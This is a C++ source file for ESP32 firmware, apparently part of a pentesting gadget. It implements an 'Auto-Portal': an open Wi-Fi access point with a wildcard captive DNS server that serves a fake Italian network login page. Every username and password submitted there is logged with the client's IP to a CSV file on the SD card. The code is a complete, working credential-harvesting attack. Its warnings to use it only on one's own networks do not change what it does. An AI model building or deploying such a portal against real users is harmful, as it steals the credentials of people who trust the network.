#include "AutoPortal.h"

#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>
#include <WiFi.h>

#include <cstdio>
#include <cstring>
#include <new>
#include <string>

#include "Display.h"
#include "Logger.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "Storage.h"
#include "Ui.h"
#include "WifiExtCommon.h"

#if ENABLE_MODULE_WIFIEXT && ENABLE_OFFENSIVE

namespace wifiext {
namespace {

constexpr const char* kHtmlPath = "/wifiext/portal.html";
constexpr const char* kCsvPath = "/wifiext/portal.csv";
constexpr const char* kApSsid = "WiFi-Portal";
constexpr uint8_t kApChannel = 6;

const char kFallbackHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Accesso Wi-Fi</title>
<style>body{font-family:sans-serif;background:#0d1117;color:#e6edf3;margin:0}
.card{max-width:420px;margin:48px auto;padding:24px;background:#161b22;border-radius:12px}
h2{margin-top:0;color:#58a6ff}input{width:100%;box-sizing:border-box;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#238636;color:#fff;font-size:16px}
small{color:#8b949e}</style></head>
<body><div class="card"><h2>Accesso rete Wi-Fi</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Utente o email" autocomplete="off" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Accedi</button>
</form>
<p><small>Portale di test: solo reti proprie o autorizzate.</small></p>
</div></body></html>)HTML";

const char kSuccessHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connessione</title></head>
<body style="font-family:sans-serif;background:#0d1117;color:#e6edf3;text-align:center;padding-top:80px">
<h2 style="color:#3fb950">Connessione in corso</h2>
<p>Attendi mentre verifichiamo i dati.</p></body></html>)HTML";

struct Captured {
    char ip[16];
    char user[64];
    char pass[64];
};

constexpr int kQueueSize = 6;
Captured g_queue[kQueueSize];
volatile uint8_t g_queueHead = 0;
volatile uint8_t g_queueTail = 0;
portMUX_TYPE g_queueMux = portMUX_INITIALIZER_UNLOCKED;

volatile uint32_t g_requests = 0;
volatile uint32_t g_saved = 0;
volatile uint32_t g_dropped = 0;
volatile uint32_t g_writeErrors = 0;

std::string g_html;
AsyncWebServer* g_server = nullptr;

void copyField(char* destination, size_t size, const String& value) {
    size_t length = value.length();
    if (length >= size) {
        length = size - 1;
    }
    memcpy(destination, value.c_str(), length);
    destination[length] = '\0';
}

const String& firstArg(AsyncWebServerRequest* request,
                       std::initializer_list<const char*> names) {
    static const String kEmpty;
    for (const char* name : names) {
        if (request->hasArg(name)) {
            return request->arg(name);
        }
    }
    return kEmpty;
}

void enqueueCredential(AsyncWebServerRequest* request) {
    Captured item = {};
    const String& user = firstArg(request, {"username", "user", "email"});
    const String& pass = firstArg(request, {"password", "pass", "pwd"});
    copyField(item.user, sizeof(item.user), user);
    copyField(item.pass, sizeof(item.pass), pass);
    if (request->client() != nullptr) {
        copyField(item.ip, sizeof(item.ip), request->client()->remoteIP().toString());
    } else {
        copyField(item.ip, sizeof(item.ip), String("?"));
    }

    portENTER_CRITICAL(&g_queueMux);
    const uint8_t next = static_cast<uint8_t>((g_queueHead + 1) % kQueueSize);
    if (next == g_queueTail) {
        ++g_dropped;  // coda piena: meglio perdere una riga che bloccare il server
    } else {
        g_queue[g_queueHead] = item;
        g_queueHead = next;
    }
    portEXIT_CRITICAL(&g_queueMux);
}

std::string csvField(const char* value) {
    // Le virgolette proteggono ';' e virgole: si normalizzano solo CR/LF.
    // L'apostrofo iniziale evita l'interpretazione come formula anche quando
    // il valore comincia con spazi/tab seguiti da = + - @.
    std::string out;
    const char* firstSignificant = value;
    while (*firstSignificant == ' ' || *firstSignificant == '\t') {
        ++firstSignificant;
    }
    const bool formulaLike =
        *firstSignificant == '=' || *firstSignificant == '+' ||
        *firstSignificant == '-' || *firstSignificant == '@';
    out.push_back('"');
    if (formulaLike) {
        out.push_back('\'');
    }
    for (const char* p = value; *p != '\0'; ++p) {
        const char c = *p;
        if (c == '\r' || c == '\n') {
            out.push_back(' ');
        } else if (c == '"') {
            out += "\"\"";
        } else {
            out.push_back(c);
        }
    }
    out.push_back('"');
    return out;
}

void drainQueue() {
    for (;;) {
        Captured item;
        bool have = false;
        portENTER_CRITICAL(&g_queueMux);
        if (g_queueTail != g_queueHead) {
            item = g_queue[g_queueTail];
            g_queueTail = static_cast<uint8_t>((g_queueTail + 1) % kQueueSize);
            have = true;
        }
        portEXIT_CRITICAL(&g_queueMux);
        if (!have) {
            break;
        }
        std::string line;
        if (!storage::exists(kCsvPath, true)) {
            line = "tempo_s;ip;utente;password\n";
        }
        line += std::to_string(millis() / 1000);
        line += ';';
        line += csvField(item.ip);
        line += ';';
        line += csvField(item.user);
        line += ';';
        line += csvField(item.pass);
        line += '\n';
        if (appendSd(kCsvPath, line)) {
            ++g_saved;
        } else {
            ++g_writeErrors;
        }
    }
}

void drawPortal(const std::string& ip, bool dnsOk) {
    display::clear();
    display::header("Auto-Portal", "WiFi+");
    display::text(8, 26, "SSID: " + std::string(kApSsid), display::kAccent, 2);
    display::text(8, 46, "IP " + ip, display::kText, 0);
    display::text(8, 60,
                  "Client " + std::to_string(WiFi.softAPgetStationNum()) +
                      "   Richieste " + std::to_string(g_requests),
                  display::kText, 0);
    std::string credLine = "Credenziali " + std::to_string(g_saved) + "  coda " +
                           std::to_string((g_queueHead - g_queueTail + kQueueSize) %
                                          kQueueSize);
    if (g_dropped > 0) {
        credLine += "  perse " + std::to_string(g_dropped);
    }
    display::text(8, 74, credLine, g_dropped > 0 ? display::kWarning : display::kText,
                  0);
    display::text(8, 88, "File: /wifiext/portal.csv", display::kTextDim, 0);
    if (!dnsOk) {
        display::text(8, 100, "!DNS captive non attivo", display::kWarning, 0);
    } else if (g_writeErrors > 0) {
        display::text(8, 100, "!Errore scrittura CSV", display::kWarning, 0);
    } else {
        display::text(8, 100, sdFreeText(), display::kTextDim, 0);
    }
    display::footer("ESC = ferma   solo reti proprie");
    display::push();
}

void countRequest() {
    ++g_requests;
}

void handlePortalPage(AsyncWebServerRequest* request) {
    countRequest();
    request->send(200, "text/html", g_html.c_str());
}

void handleLogin(AsyncWebServerRequest* request) {
    countRequest();
    // Limite esplicito: un AP aperto non deve poter far accumulare form enormi.
    if (request->contentLength() > 1024) {
        request->send(413, "text/plain", "Richiesta troppo grande");
        return;
    }
    enqueueCredential(request);
    request->send(200, "text/html", kSuccessHtml);
}

// Il server resta allocato per tutta la vita del firmware: AsyncWebServer::end()
// non attende i callback gia' in esecuzione, quindi distruggerlo (o liberare
// g_html) all'uscita sarebbe un use-after-free.
bool ensureServer() {
    if (g_server != nullptr) {
        return true;
    }
    g_server = new (std::nothrow) AsyncWebServer(80);
    if (g_server == nullptr) {
        return false;
    }
    g_server->on("/", HTTP_GET, handlePortalPage);
    g_server->on("/login", HTTP_POST, handleLogin);
    g_server->onNotFound([](AsyncWebServerRequest* request) {
        countRequest();
        request->send(200, "text/html", g_html.c_str());
    });
    return true;
}

}  // namespace

void runAutoPortal() {
    if (!ui::legalWarning("Auto-Portal",
                          {"AP aperto con DNS captive e",
                           "pagina di login. Le credenziali",
                           "finiscono su SD. Solo reti proprie."},
                          "WiFi+")) {
        return;
    }
    if (!storage::hasSD()) {
        ui::message("Auto-Portal",
                    {"Serve una microSD: le credenziali",
                     "vengono salvate solo su SD."},
                    "WiFi+");
        return;
    }

    ensureDir();
    if (!ensureServer()) {
        ui::message("Auto-Portal", {"Memoria insufficiente per il server HTTP."}, "WiFi+");
        return;
    }
    g_html.clear();
    if (!storage::readText(kHtmlPath, g_html, 16384, true) || g_html.empty()) {
        g_html = kFallbackHtml;
        logger::info("Auto-Portal: pagina interna (portal.html assente)");
    }
    g_requests = 0;
    g_saved = 0;
    g_dropped = 0;
    g_writeErrors = 0;
    g_queueHead = 0;
    g_queueTail = 0;

    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    delay(60);
    if (!WiFi.softAP(kApSsid, nullptr, kApChannel, 0, 4)) {
        WiFi.mode(WIFI_OFF);
        ui::message("Auto-Portal", {"Creazione access point non riuscita."}, "WiFi+");
        return;
    }
    const IPAddress ip = WiFi.softAPIP();

    DNSServer dns;
    const bool dnsOk = dns.start(53, "*", ip);
    if (!dnsOk) {
        logger::warn("Auto-Portal: DNS captive non avviato");
    }

    AsyncWebServer& server = *g_server;
    server.begin();

    logger::info("Auto-Portal avviato su %s", ip.toString().c_str());
    const std::string ipText = ip.toString().c_str();
    uint32_t lastDraw = 0;
    navigation::waitRelease();
    for (;;) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        if (dnsOk) {
            dns.processNextRequest();
        }
        drainQueue();

        const uint32_t now = millis();
        if (now - lastDraw > 300) {
            drawPortal(ipText, dnsOk);
            lastDraw = now;
        }
        delay(5);
    }

    drainQueue();
    server.end();
    // Attesa limitata: AsyncWebServer::end() chiude solo il listening socket,
    // non sincronizza i callback del task AsyncTCP. g_server e g_html restano
    // allocati (riusati al prossimo avvio), quindi nessun use-after-free.
    const uint32_t graceStart = millis();
    while (millis() - graceStart < 250) {
        delay(5);
    }
    drainQueue();
    if (dnsOk) {
        dns.stop();
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    logger::info("Auto-Portal fermato: %u richieste, %u credenziali, %u perse",
                 static_cast<unsigned>(g_requests), static_cast<unsigned>(g_saved),
                 static_cast<unsigned>(g_dropped));
}

}  // namespace wifiext

#endif  // ENABLE_MODULE_WIFIEXT && ENABLE_OFFENSIVE
